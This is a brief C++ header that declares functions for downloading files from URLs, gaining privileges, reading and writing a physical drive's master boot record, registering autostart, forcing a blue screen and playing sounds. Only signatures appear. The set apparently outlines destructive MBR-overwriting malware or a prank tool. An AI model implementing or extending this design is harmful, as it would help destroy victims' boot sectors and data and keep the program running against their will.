#pragma once

#include"std.h"



bool DownloadFileFromURL(std::wstring url, std::wstring filepath);
void GetPrivileges();
bool WritePhydriveMBR(unsigned int id, std::string msgstr);
std::string ReadPhydriveMBR(unsigned int id);
void RegAutoStart();
void MakeBlueScreen(unsigned int errid);
void PlaySoundFile(std::wstring soundname, bool sync);